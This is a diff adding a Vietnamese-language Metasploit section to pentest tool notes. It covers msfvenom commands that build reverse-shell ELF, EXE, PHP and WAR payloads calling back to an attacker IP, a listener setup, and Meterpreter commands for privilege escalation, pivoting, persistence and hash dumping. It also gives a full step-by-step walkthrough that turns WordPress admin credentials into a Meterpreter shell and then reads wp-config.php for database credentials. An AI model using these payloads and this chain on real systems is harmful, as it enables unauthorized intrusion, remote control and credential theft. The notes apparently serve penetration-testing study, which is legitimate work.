@@ -9,6 +9,7 @@
 | [Nmap](#nmap) | Network scanner — phát hiện host, port, service, OS, chạy script | Reconnaissance / Enumeration |
 | [WPScan](#wpscan) | WordPress security scanner — enumerate user, plugin, theme, brute force | Reconnaissance / Exploitation |
 | [WPVulnDB](#wpvulndb) | Database lỗ hổng WordPress — tra cứu CVE theo plugin/theme/core version | Research / Exploitation |
+| [Metasploit](#metasploit) | Framework khai thác lỗ hổng — tích hợp exploit, payload, post-exploitation | Exploitation / Post-Exploitation |
 
 ---
 
@@ -894,3 +895,310 @@ curl -H "Authorization: Token token=<YOUR_TOKEN>" \
 - Dùng kết hợp với WPScan: `--api-token <token>` để tự động map CVE vào kết quả scan
 - Mỗi entry có mô tả lỗ hổng, CVSS score, affected version, link tham khảo và đôi khi có PoC
 - Tìm plugin slug từ URL WordPress.org: `wordpress.org/plugins/<slug>`
+
+---
+
+# Metasploit
+
+**Repo:** https://github.com/rapid7/metasploit-framework
+**Tác giả:** Rapid7
+**Ngôn ngữ:** Ruby
+
+## Khái niệm
+
+Metasploit Framework là **framework khai thác lỗ hổng** mạnh nhất và phổ biến nhất trong pentest. Cung cấp:
+- Thư viện exploit sẵn có cho hàng nghìn CVE
+- Hệ thống payload linh hoạt (Meterpreter, shell, staged/stageless)
+- Module auxiliary cho scanning, brute force, enumeration
+- Module post-exploitation cho privilege escalation, pivoting, persistence
+
+**Dùng khi nào:**
+- Khai thác lỗ hổng đã biết CVE
+- Cần shell / Meterpreter session nhanh
+- Post-exploitation sau khi có foothold
+
+---
+
+## Khởi động
+
+```bash
+# Khởi động Metasploit console
+msfconsole
+
+# Khởi động nhanh không có banner
+msfconsole -q
+
+# Cập nhật database
+msfdb init
+msfdb start
+```
+
+---
+
+## Các lệnh cơ bản trong msfconsole
+
+```bash
+help                        # Xem danh sách lệnh
+search <keyword>            # Tìm module
+use <module_path>           # Chọn module
+info                        # Xem thông tin module đang dùng
+show options                # Xem các option cần set
+show payloads               # Xem payload tương thích
+set <OPTION> <value>        # Set option
+setg <OPTION> <value>       # Set option global (dùng cho tất cả module)
+unset <OPTION>              # Bỏ set option
+run / exploit               # Chạy module
+back                        # Thoát module hiện tại
+sessions                    # Xem danh sách session đang mở
+sessions -i <id>            # Vào session theo ID
+```
+
+---
+
+## Cấu trúc module
+
+```
+auxiliary/    ← scan, brute force, enumeration, fuzzing
+exploit/      ← khai thác lỗ hổng → tạo session
+payload/      ← code chạy trên target sau khi exploit thành công
+post/         ← post-exploitation (sau khi có session)
+encoder/      ← mã hóa payload để bypass AV
+evasion/      ← kỹ thuật tránh phát hiện
+```
+
+---
+
+## Payload — Staged vs Stageless
+
+```
+Staged   (/)  : payload nhỏ → kết nối về attacker → tải phần còn lại
+                Ví dụ: windows/meterpreter/reverse_tcp
+                Dùng khi: kích thước payload bị giới hạn
+
+Stageless (_) : payload đầy đủ trong 1 file
+                Ví dụ: windows/meterpreter_reverse_tcp
+                Dùng khi: không có kết nối ổn định về attacker
+```
+
+---
+
+## Listener — Nhận reverse shell
+
+```bash
+# [ATTACKER] — Tạo listener nhận kết nối từ target
+use exploit/multi/handler
+set PAYLOAD linux/x86/meterpreter/reverse_tcp   # hoặc payload phù hợp
+set LHOST 192.168.1.100                          # IP attacker
+set LPORT 4444
+run -j                                           # chạy nền (-j = job)
+```
+
+---
+
+## Tạo payload với msfvenom
+
+```bash
+# Linux ELF reverse shell
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o shell.elf
+
+# Windows EXE reverse shell
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o shell.exe
+
+# PHP webshell (dùng upload lên web)
+msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.php
+
+# WAR file (Tomcat)
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f war -o shell.war
+```
+
+---
+
+## Meterpreter — Các lệnh thường dùng
+
+```bash
+# Thông tin hệ thống
+sysinfo          # OS, hostname, architecture
+getuid           # User hiện tại
+getpid           # PID của session
+
+# File system
+pwd              # Thư mục hiện tại
+ls               # Liệt kê file
+cd <dir>         # Chuyển thư mục
+download <file>  # Tải file về attacker
+upload <file>    # Upload file lên target
+cat <file>       # Đọc nội dung file
+
+# Shell
+shell            # Mở shell tương tác
+execute -f cmd -i -H   # Chạy lệnh ẩn
+
+# Privilege escalation
+getsystem        # Thử leo thang lên SYSTEM (Windows)
+getprivs         # Xem privileges hiện tại
+
+# Pivoting
+portfwd add -l 8080 -p 80 -r 10.10.10.5   # Port forward
+route add 10.10.10.0/24 <session_id>        # Thêm route qua session
+
+# Persistence
+run persistence -h   # Xem options persistence
+
+# Dump credential
+run post/multi/recon/local_exploit_suggester   # Gợi ý local exploit
+run post/windows/gather/hashdump               # Dump NTLM hash (Windows)
+```
+
+---
+
+## Module wp_admin_shell_upload
+
+**Module path:** `exploit/unix/webapp/wp_admin_shell_upload`
+**Loại:** Authenticated RCE
+**Yêu cầu:** Credential admin WordPress
+
+### Cơ chế hoạt động
+
+```
+1. Đăng nhập wp-admin bằng credential được cung cấp
+2. Upload một plugin PHP độc hại dưới dạng file .zip
+3. Activate plugin → WordPress thực thi PHP code
+4. Mở reverse shell / Meterpreter session về attacker
+5. Xóa plugin sau khi có session (cleanup tùy chọn)
+```
+
+### Sử dụng
+
+```bash
+# [ATTACKER] — trong msfconsole
+use exploit/unix/webapp/wp_admin_shell_upload
+
+# Xem tất cả option
+show options
+```
+
+```
+Module options:
+
+  NAME       REQUIRED  DESCRIPTION
+  ----       --------  -----------
+  PASSWORD   yes       WordPress admin password
+  Proxies    no        Proxy chain
+  RHOSTS     yes       Target host(s)
+  RPORT      yes       Target port (default: 80)
+  SSL        no        Use SSL/TLS
+  TARGETURI  yes       WordPress base path (default: /)
+  USERNAME   yes       WordPress admin username
+  VHOST      no        Virtual host
+```
+
+```bash
+# Set các option cần thiết
+set RHOSTS 192.168.1.10
+set USERNAME admin
+set PASSWORD password123
+set TARGETURI /wordpress/        # nếu WP không ở root
+set LHOST 192.168.1.100
+set LPORT 4444
+
+# Xem payload mặc định
+show options   # PAYLOAD mặc định: php/meterpreter/reverse_tcp
+
+# Đổi payload nếu cần
+set PAYLOAD php/reverse_php      # stageless PHP shell đơn giản hơn
+
+# Chạy
+run
+```
+
+### Ví dụ output thành công
+
+```
+[*] Started reverse TCP handler on 192.168.1.100:4444
+[*] Authenticating with WordPress using admin:password123...
+[+] Authenticated with WordPress
+[*] Preparing payload...
+[*] Uploading payload...
+[+] Payload uploaded as rFqxMkBv.php
+[*] Activating the plugin...
+[*] Sending stage (39927 bytes) to 192.168.1.10
+[*] Meterpreter session 1 opened (192.168.1.100:4444 -> 192.168.1.10:54321)
+
+meterpreter > sysinfo
+Computer    : target
+OS          : Linux target 5.4.0 #1 SMP
+Meterpreter : php/linux
+```
+
+### Các option nâng cao
+
+```bash
+# Dùng qua proxy (Burp để quan sát traffic)
+set Proxies HTTP:127.0.0.1:8080
+
+# Target WordPress trên HTTPS
+set SSL true
+set RPORT 443
+
+# WordPress ở subdirectory
+set TARGETURI /blog/
+
+# Đổi LPORT nếu 4444 bị chặn
+set LPORT 443
+set LPORT 80
+```
+
+### Troubleshooting
+
+```bash
+# Lỗi: "Exploit failed: The target is not exploitable"
+# → Kiểm tra lại credential
+# → Kiểm tra TARGETURI (thêm / ở cuối)
+# → Kiểm tra user có quyền install plugin không
+
+# Lỗi: session mở rồi đóng ngay
+# → Thử đổi sang stageless payload
+set PAYLOAD php/meterpreter_reverse_tcp
+
+# Lỗi: không kết nối được về LHOST
+# → Kiểm tra firewall attacker machine
+# → Thử dùng reverse_tcp thay vì bind_tcp
+# → Kiểm tra LHOST đúng IP interface không
+```
+
+---
+
+## Workflow WordPress → Meterpreter
+
+```
+Bước 1 — Có credential admin (từ brute force / SQLi / credential exposure)
+
+Bước 2 — [ATTACKER] msfconsole
+use exploit/unix/webapp/wp_admin_shell_upload
+set RHOSTS <target_ip>
+set USERNAME admin
+set PASSWORD <password>
+set LHOST <attacker_ip>
+run
+
+Bước 3 — Có Meterpreter session
+sysinfo
+getuid
+shell
+
+Bước 4 — Đọc wp-config.php lấy DB credential
+cat /var/www/html/wp-config.php
+
+Bước 5 — Post-exploitation
+run post/multi/recon/local_exploit_suggester
+```
+
+---
+
+## Tips
+
+- Module này cần quyền **admin** — kết hợp với WPScan brute force để có credential trước
+- Nếu target chặn port 4444, thử `set LPORT 80` hoặc `set LPORT 443` — thường không bị chặn outbound
+- Dùng `set PAYLOAD php/meterpreter_reverse_tcp` (stageless) khi mạng không ổn định
+- Sau khi có shell, đọc `wp-config.php` ngay — chứa DB credential có thể dùng để leo thang thêm
+- Dùng `sessions -u <id>` để upgrade shell thường lên Meterpreter nếu cần
